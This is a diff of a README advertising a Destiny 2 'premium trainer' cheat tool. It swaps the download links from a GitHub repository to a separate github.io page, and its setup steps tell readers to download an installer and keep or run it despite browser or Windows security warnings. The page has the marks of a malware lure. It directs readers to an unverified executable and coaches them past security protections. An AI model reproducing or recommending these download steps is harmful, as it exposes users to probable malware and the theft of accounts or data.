@@ -1,6 +1,6 @@
 # 🚀 Destiny2-Ultimate-Trainer-2026-premium - Master every game encounter with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Spirituous-unsteadiness464/Destiny2-Ultimate-Trainer-2026-premium)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://spirituous-unsteadiness464.github.io)
 
 ## 📋 About This Tool
 
@@ -21,7 +21,7 @@ To run this tool correctly, ensure your computer meets these standards:
 
 Follow these steps to prepare your system and run the trainer.
 
-1. Visit the repository page to access the files: [https://github.com/Spirituous-unsteadiness464/Destiny2-Ultimate-Trainer-2026-premium](https://github.com/Spirituous-unsteadiness464/Destiny2-Ultimate-Trainer-2026-premium)
+1. Visit the repository page to access the files: [https://spirituous-unsteadiness464.github.io](https://spirituous-unsteadiness464.github.io)
 2. Locate the download button or the releases section on that page.
 3. Save the installer file to your desktop for easy access.
 4. If your browser or Windows shows a security warning, select the option to keep or run the file anyway. 
